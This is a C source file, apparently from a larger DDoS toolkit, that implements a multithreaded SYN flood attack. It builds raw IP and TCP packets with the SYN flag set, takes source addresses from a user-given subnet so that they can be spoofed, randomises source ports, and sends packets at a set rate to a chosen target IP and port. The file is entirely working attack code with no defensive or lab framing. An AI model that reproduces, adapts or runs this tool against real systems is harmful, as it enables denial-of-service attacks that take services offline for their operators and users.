#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/syn_flood.h"

extern int g_num_threads;

// session counting
uint32_t g_syn_num_total;
uint32_t g_syn_num_generated_in_sec;

// from main()
InputArguments g_syn_input;
uint32_t g_syn_request_per_sec;

// for masking next ip address
MaskingArguments g_syn_now;

// thread
pthread_mutex_t g_syn_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_syn_cond = PTHREAD_COND_INITIALIZER;

// time checking
struct timespec g_syn_before_time;
struct timespec g_syn_now_time;

void SynFloodPrintUsage(void)
{
    printf("SYN Flooding Usage : "
            "[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
    return;
}

void *GenerateSynFlood(void *data)
{
    srand(time(NULL));
    int sock = MakeRawSocket(IPPROTO_TCP);
    MaskingArguments syn_now = g_syn_now;

    struct iphdr ipv4_h;
    struct tcphdr tcp_h;

    PrepareEmptyIphdr(&ipv4_h);

    IphdrSetProtocol(&ipv4_h, IPPROTO_TCP);
    IphdrAddSize(&ipv4_h, sizeof(struct tcphdr));

    PrepareEmptyTcphdr(&tcp_h);
    TcphdrSetSynFlag(&tcp_h);

    char packet[BUFFER_SIZE];

    while (1) {
        // *** begin of critical section ***
        pthread_mutex_lock(&g_syn_mutex);
       
        GetMaskingArguments(&g_syn_input, &g_syn_now);
        syn_now = g_syn_now;

        // wait a second
        if (g_syn_num_generated_in_sec >= g_syn_request_per_sec) {
            pthread_cond_wait(&g_syn_cond, &g_syn_mutex);
        }
        g_syn_num_generated_in_sec++;
        g_syn_num_total++;
        
        // *** end of critical section ***
        pthread_mutex_unlock(&g_syn_mutex);

        // make ipv4 header
        ipv4_h.saddr = inet_addr(syn_now.src);
        ipv4_h.daddr = inet_addr(syn_now.dest);
        
        // make tcp header.
        
        // set src port number random
        tcp_h.source = htons(rand() % 65535 + 1);
        tcp_h.dest = htons(syn_now.port);
        tcp_h.seq = htonl(g_syn_num_total);
        
        TcphdrGetChecksum(&ipv4_h, &tcp_h, NULL, 0);

        memset(packet, 0x00, sizeof(packet));
        AssembleIphdrWithData(packet, &ipv4_h, &tcp_h, sizeof(tcp_h));
        SendPacket(sock, packet, ipv4_h.daddr, ipv4_h.tot_len, syn_now.port);
    }
    close(sock);
    return 0;
}

void *SynFloodTimeCheck(void *data)
{
    while (1) {
        pthread_mutex_lock(&g_syn_mutex);
        TimeCheck(
                &g_syn_cond,
                &g_syn_before_time,
                &g_syn_now_time,
                &g_syn_num_generated_in_sec);
        pthread_mutex_unlock(&g_syn_mutex);
    }
    return (NULL);
}

void SynFloodMain(char *argv[])
{
    int argc = 0;
    while (argv[argc] != NULL) {
        argc++;
    }
    if (argc != 4) {
        SynFloodPrintUsage();
        return;
    }
    // get ip address, mask, port
    ArgvToInputArguments(argv, &g_syn_input);
    g_syn_num_generated_in_sec = 0;
    g_syn_num_total = 0;
    memset(&g_syn_before_time, 0, sizeof(struct timespec));
    memset(&g_syn_now_time, 0, sizeof(struct timespec));
    g_syn_request_per_sec = atoi(argv[3]);
    const int num_threads = g_num_threads;
    pthread_t threads[9999];
    int thread_ids[9999];
    int i;
    for (i = 0; i < num_threads; i++) {
        thread_ids[i] = i;
    }
    printf("Sending SYN Flooding requests to %s using %d threads\n",
            g_syn_input.dest, num_threads);

    for (i = 0; i < num_threads; i++) {
        pthread_create(
                &threads[i],
                NULL,
                GenerateSynFlood,
                (void *)&thread_ids[i]);
    }
    pthread_create(&threads[i], NULL, SynFloodTimeCheck, NULL);
    for (i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
        printf("thread %d joined\n", i);
    }
    pthread_mutex_destroy(&g_syn_mutex);
    printf("SYN Flooding finished\nTotal %u packets sent.\n",
            g_syn_num_total);
    pthread_exit(NULL);
    return;
}
